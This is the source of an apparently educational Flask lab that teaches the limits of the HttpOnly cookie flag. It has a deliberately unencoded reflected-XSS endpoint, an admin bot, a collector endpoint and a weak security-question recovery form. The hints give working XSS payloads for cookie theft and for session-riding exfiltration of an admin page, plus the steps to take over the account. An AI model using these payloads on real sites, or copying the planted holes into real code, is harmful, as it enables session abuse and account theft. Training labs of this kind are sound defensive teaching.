"""
WildWebApps protection lab - HttpOnly cookie flag (demonstrated against reflected XSS).

This lab shows what the HttpOnly cookie attribute does, and what it does NOT do.
The reflected XSS at `/` is REAL: the `q` parameter is written into the page with
no encoding, so injected script executes - exactly like the reflected-XSS lab.
The admin's session cookie is set HttpOnly.

  What HttpOnly does:      the classic `document.cookie` theft no longer sees the
                           session cookie, so that steal fails.
  What HttpOnly does NOT:  it does not fix XSS. The browser still attaches the
                           cookie to same-origin requests, so injected script can
                           still RIDE the admin session and read admin-only pages.

Account-takeover path the lab teaches:
  1. The admin dashboard login needs a username + password (unknown to you).
  2. But the dashboard also has a weak "forgot password" recovery: answer the
     security question and you are in.
  3. The authed dashboard displays the account's security question AND its secret
     answer. Riding the admin session (fetch /dashboard) leaks that secret answer
     to your collector.
  4. Submit the secret answer on the recovery form to log in, and submit it as the
     flag. HttpOnly protected the cookie, but session riding + weak recovery still
     led to takeover.
"""
import os
import secrets
import time
from urllib.parse import urlsplit

from flask import (
    Flask, render_template, request, jsonify, redirect, url_for, Response,
)

import vulnlab

app = Flask(__name__)

# The secret answer to the account's security question. It doubles as the lab flag
# and the account-recovery token. Fresh per process start (rotates on restart).
FLAG = vulnlab.generate_flag()
SECURITY_QUESTION = "What was the name of your first pet?"

# Admin login credentials. The password is never shown and is not the intended
# path: it exists so the login form is real and the attacker cannot simply log in.
ADMIN_USER = "admin"
ADMIN_PASS = secrets.token_hex(8)

# The admin session cookie value (the HttpOnly cookie the bot carries). Distinct
# from the flag, so even a "cookie read" would not directly hand over the flag.
SESSION_ID = secrets.token_hex(16)

PORT = int(os.environ.get("PORT", "8000"))
LOCAL_BASE = f"http://127.0.0.1:{PORT}"

LOOT: list[dict] = []
LOOT_MAX = 50


def _authed() -> bool:
    return request.cookies.get("session") == SESSION_ID


def _session_cookie(resp):
    """Set the admin session as an HttpOnly cookie (sent back via the Cookie header)."""
    resp.set_cookie("session", SESSION_ID, httponly=True, samesite="Lax")
    return resp


# ── The admin victim ─────────────────────────────────────────────────────────
def admin_visit(path_and_query: str) -> str:
    """Open the reported URL in a headless browser logged in as the admin."""
    try:
        from playwright.sync_api import sync_playwright
    except Exception as exc:  # Playwright missing - only happens outside the image
        return f"admin browser unavailable: {exc}"

    target = LOCAL_BASE + path_and_query
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(args=["--no-sandbox", "--disable-dev-shm-usage"])
            try:
                ctx = browser.new_context()
                ctx.add_cookies([
                    {
                        # The session cookie: HttpOnly, so document.cookie cannot read it.
                        "name": "session", "value": SESSION_ID, "url": LOCAL_BASE,
                        "httpOnly": True, "sameSite": "Lax",
                    },
                    {
                        # A non-HttpOnly decoy, so document.cookie is not simply empty.
                        "name": "theme", "value": "dark", "url": LOCAL_BASE,
                        "httpOnly": False, "sameSite": "Lax",
                    },
                ])
                page = ctx.new_page()
                page.goto(target, wait_until="load", timeout=8000)
                page.wait_for_timeout(900)  # let an injected beacon fire
            finally:
                browser.close()
        return ""
    except Exception as exc:
        return f"admin visit failed: {exc}"


# ── In-lab code switcher: setting a cookie WITHOUT vs WITH HttpOnly ───────────
LANGUAGES = {
    "Python": {
        "vuln": (
            "# Flask - cookie readable by JavaScript\n"
            "resp = make_response('ok')\n"
            "resp.set_cookie('session', token)  # no HttpOnly"
        ),
        "fixed": (
            "# Flask - cookie hidden from JavaScript\n"
            "resp = make_response('ok')\n"
            "resp.set_cookie('session', token,\n"
            "                httponly=True, secure=True, samesite='Lax')"
        ),
        "doc": "https://flask.palletsprojects.com/en/stable/api/#flask.Response.set_cookie",
    },
    "JavaScript": {
        "vuln": (
            "// Express - readable by document.cookie\n"
            "res.cookie('session', token);"
        ),
        "fixed": (
            "// Express - HttpOnly hides it from JS\n"
            "res.cookie('session', token, {\n"
            "  httpOnly: true, secure: true, sameSite: 'lax'\n"
            "});"
        ),
        "doc": "https://expressjs.com/en/api.html#res.cookie",
    },
    "TypeScript": {
        "vuln": (
            "// Express (typed) - no HttpOnly\n"
            "res.cookie('session', token);"
        ),
        "fixed": (
            "import { CookieOptions } from 'express';\n"
            "const opts: CookieOptions = { httpOnly: true, secure: true, sameSite: 'lax' };\n"
            "res.cookie('session', token, opts);"
        ),
        "doc": "https://expressjs.com/en/api.html#res.cookie",
    },
    "PHP": {
        "vuln": (
            "// readable by document.cookie\n"
            "setcookie('session', $token);"
        ),
        "fixed": (
            "setcookie('session', $token, [\n"
            "  'httponly' => true, 'secure' => true, 'samesite' => 'Lax',\n"
            "]);"
        ),
        "doc": "https://www.php.net/manual/en/function.setcookie.php",
    },
    "Java": {
        "vuln": (
            "Cookie c = new Cookie(\"session\", token);\n"
            "response.addCookie(c);  // no HttpOnly"
        ),
        "fixed": (
            "Cookie c = new Cookie(\"session\", token);\n"
            "c.setHttpOnly(true);\n"
            "c.setSecure(true);\n"
            "response.addCookie(c);"
        ),
        "doc": "https://jakarta.ee/specifications/servlet/5.0/apidocs/jakarta/servlet/http/cookie",
    },
    "Ruby": {
        "vuln": (
            "# Rails / Rack - readable by JS\n"
            "cookies[:session] = token"
        ),
        "fixed": (
            "cookies[:session] = {\n"
            "  value: token, httponly: true, secure: true, same_site: :lax\n"
            "}"
        ),
        "doc": "https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html",
    },
    "Go": {
        "vuln": (
            "http.SetCookie(w, &http.Cookie{\n"
            "    Name: \"session\", Value: token,\n"
            "})  // HttpOnly defaults to false"
        ),
        "fixed": (
            "http.SetCookie(w, &http.Cookie{\n"
            "    Name: \"session\", Value: token,\n"
            "    HttpOnly: true, Secure: true, SameSite: http.SameSiteLaxMode,\n"
            "})"
        ),
        "doc": "https://pkg.go.dev/net/http#Cookie",
    },
    "C#": {
        "vuln": (
            "// ASP.NET Core - no HttpOnly\n"
            "Response.Cookies.Append(\"session\", token);"
        ),
        "fixed": (
            "Response.Cookies.Append(\"session\", token, new CookieOptions {\n"
            "    HttpOnly = true, Secure = true, SameSite = SameSiteMode.Lax,\n"
            "});"
        ),
        "doc": "https://learn.microsoft.com/en-us/dotnet/api/microsoft.aspnetcore.http.cookieoptions",
    },
}

CONTEXT = vulnlab.lab_context(
    title="HttpOnly Cookie Flag (vs Reflected XSS)",
    owasp="Defense: HttpOnly cookie attribute",
    summary=(
        "Same reflected XSS as the vulnerability lab, but the admin's session "
        "cookie is HttpOnly, so the classic cookie steal fails. Ride the admin "
        "session to read the dashboard, capture the account's secret recovery "
        "answer, then use the recovery form to take over the account and recover "
        "the flag."
    ),
    instructions=[
        "Search anything, then View Source: your input is reflected into the HTML "
        "un-encoded. The XSS is real.",
        "The admin bot is logged in. Its `session` cookie is HttpOnly, so "
        "JavaScript cannot read it (a non-HttpOnly `theme` cookie is also set).",
        "Try the classic cookie theft and report it. On /loot you will see only "
        "`theme=dark`, never the session: that is HttpOnly working.",
        "HttpOnly does not stop XSS. Ride the session: make the admin's browser "
        "fetch the admin-only /dashboard and exfiltrate the HTML. It contains the "
        "account security question and its secret answer.",
        "Open /dashboard (linked below). The login needs the admin password (you "
        "do not have it), but the recovery form accepts the secret answer you just "
        "captured. Recover the account, then submit that secret answer as the flag.",
    ],
    hints=[
        "Confirm the XSS first:  <script>alert(1)</script>",
        "See HttpOnly in action - this returns only the non-HttpOnly cookie, never "
        "the session:  "
        "<script>new Image().src=`/collect?c=${encodeURIComponent(document.cookie)}`</script>",
        "Ride the session. The HttpOnly cookie is still attached to same-origin "
        "requests, so fetch the admin page and beacon its HTML (the secret answer "
        "is in it):  "
        "<script>fetch('/dashboard').then(r=>r.text()).then(t=>{new Image().src="
        "`/collect?c=${encodeURIComponent(t)}`})</script>  "
        "Report http://127.0.0.1:8000/?q=<that payload>, then open /loot.",
        "Take over the account: the login wants a password you do not have, but the "
        "recovery form only asks the security-question answer. Paste the captured "
        "secret answer there to log in. It is also the flag.",
        "Lesson: HttpOnly removes the easy `document.cookie` theft vector, but it is "
        "defense-in-depth, not a fix. Encode output (stop the XSS), do not expose "
        "secrets in pages, harden account recovery, and add a Content-Security-Policy "
        "plus the Secure + SameSite cookie attributes.",
    ],
    languages=LANGUAGES,
    references=[
        ("OWASP - HttpOnly", "https://owasp.org/www-community/HttpOnly"),
        ("MDN - Set-Cookie: HttpOnly", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#httponly"),
        ("OWASP - Cross Site Scripting (XSS)", "https://owasp.org/www-community/attacks/xss/"),
    ],
)


def _render_dashboard(login_error=False, recover_error=False):
    authed = _authed()
    return render_template(
        "dashboard.html",
        authed=authed,
        security_question=SECURITY_QUESTION,
        secret_answer=(FLAG if authed else None),
        login_error=login_error,
        recover_error=recover_error,
    )


# ── Routes ───────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    q = request.args.get("q", "")
    # === REFLECTED XSS (real) ===============================================
    # `reflected` is rendered with Jinja's |safe filter in index.html, so the
    # attacker-controlled `q` reaches the HTML body with NO output encoding.
    # ========================================================================
    reflected = f"You searched for: <strong>{q}</strong>" if q else ""
    return render_template("index.html", q=q, reflected=reflected, **CONTEXT)


@app.route("/dashboard")
def dashboard():
    # Admin-only page. With a valid session cookie it shows the dashboard,
    # including the account security question and its secret answer. Without one
    # it shows the login + recovery forms. The browser attaches the HttpOnly
    # cookie automatically, which is why XSS can still read this page.
    return _render_dashboard()


@app.route("/login", methods=["POST"])
def login():
    # The legitimate path: username + password. The attacker does not know the
    # password, so this is a dead end for them (it exists for realism).
    user = request.form.get("username", "")
    pw = request.form.get("password", "")
    if user == ADMIN_USER and pw == ADMIN_PASS:
        return _session_cookie(redirect(url_for("dashboard")))
    return _render_dashboard(login_error=True)


@app.route("/recover", methods=["POST"])
def recover():
    # The weak path: answer the security question. The secret answer is the value
    # leaked by riding the admin session, so this is the attacker's way in.
    answer = request.form.get("answer", "").strip()
    if answer == FLAG:
        return _session_cookie(redirect(url_for("dashboard")))
    return _render_dashboard(recover_error=True)


@app.route("/logout")
def logout():
    resp = redirect(url_for("dashboard"))
    resp.delete_cookie("session")
    return resp


@app.route("/report", methods=["POST"])
def report():
    """Deliver an attacker URL to the admin bot, which opens it while logged in."""
    raw = request.form.get("url", "")
    parts = urlsplit(raw)
    path_and_query = parts.path or "/"
    if parts.query:
        path_and_query += "?" + parts.query
    if not path_and_query.startswith("/"):
        path_and_query = "/" + path_and_query
    err = admin_visit(path_and_query)
    return redirect(url_for("loot", err=err) if err else url_for("loot"))


@app.route("/collect", methods=["GET", "POST"])
def collect():
    """Attacker's collector. An injected script beacons stolen data here."""
    data = request.values.get("c", "")
    if data:
        LOOT.append({
            "time": time.strftime("%H:%M:%S"),
            "src": request.remote_addr or "?",
            "data": data,
        })
        del LOOT[:-LOOT_MAX]
    gif = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!"
           b"\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01"
           b"\x00\x00\x02\x02D\x01\x00;")
    return Response(gif, mimetype="image/gif")


@app.route("/loot")
def loot():
    return render_template("loot.html", loot=list(reversed(LOOT)),
                           err=request.args.get("err", ""), **CONTEXT)


@app.route("/check", methods=["POST"])
def check():
    submitted = request.form.get("flag", "")
    return jsonify(correct=vulnlab.check_flag(FLAG, submitted))


if __name__ == "__main__":
    host = os.environ.get("HOST", "127.0.0.1")
    # threaded so the admin bot's inbound page load is served while /report waits.
    app.run(host=host, port=PORT, debug=False, threaded=True)
